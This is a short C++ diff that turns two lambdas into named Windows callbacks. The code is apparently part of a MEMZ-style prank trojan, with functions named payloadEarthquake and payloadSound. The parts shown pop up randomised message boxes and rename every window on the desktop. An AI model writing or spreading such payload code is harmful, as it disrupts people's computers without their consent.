@@ -85,18 +85,20 @@ LONG_PTR CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam)
     return CallNextHookEx(0, nCode, wParam, lParam);
 }
 
+DWORD CALLBACK msgBoxThr(void* param)
+{
+    HHOOK hook = SetWindowsHookExA(WH_CALLWNDPROCRET, msgBoxHook, 0, GetCurrentThreadId());
+    DWORD msg = Utils::random(7) + (Utils::random(5) << 4);
+    MessageBoxA(NULL, "text", "caption", msg);
+    Sleep(1000);
+    UnhookWindowsHookEx(hook);
+    return 0;
+}
+
 void spawnMsgBox()
 {
-    auto thr = [](void* param) WINAPI -> DWORD {
-        HHOOK hook = SetWindowsHookExA(WH_CALLWNDPROCRET, msgBoxHook, 0, GetCurrentThreadId());
-        DWORD msg = Utils::random(7) + (Utils::random(5) << 4);
-        MessageBoxA(NULL, "text", "caption", msg);
-        Sleep(1000);
-        UnhookWindowsHookEx(hook);
-        return 0;
-    };
     int thread_param = 42;
-    CreateThread(nullptr, 0, thr, &thread_param, 0, nullptr);
+    CreateThread(nullptr, 0, &msgBoxThr, &thread_param, 0, nullptr);
 }
 
 void payloadEarthquake()
@@ -155,12 +157,13 @@ void payloadSound()
         SND_ASYNC | SND_ALIAS_ID);
 }
 
+BOOL CALLBACK callbackEnum(HWND hWnd, LPARAM lParam)
+{
+    SendMessageTimeoutW(hWnd, WM_SETTEXT, 0, lParam, SMTO_ABORTIFHUNG, 100, 0);
+    return 1;
+}
+
 void setWinTitle(LPCWSTR t)
 {
-    EnumChildWindows(GetDesktopWindow(),
-        [](HWND hWnd, LPARAM lParam) CALLBACK -> BOOL {
-            SendMessageTimeoutW(hWnd, WM_SETTEXT, 0, lParam, SMTO_ABORTIFHUNG, 100, 0);
-            return 1;
-        },
-        (long)t);
+    EnumChildWindows(GetDesktopWindow(), &callbackEnum, (long)t);
 }
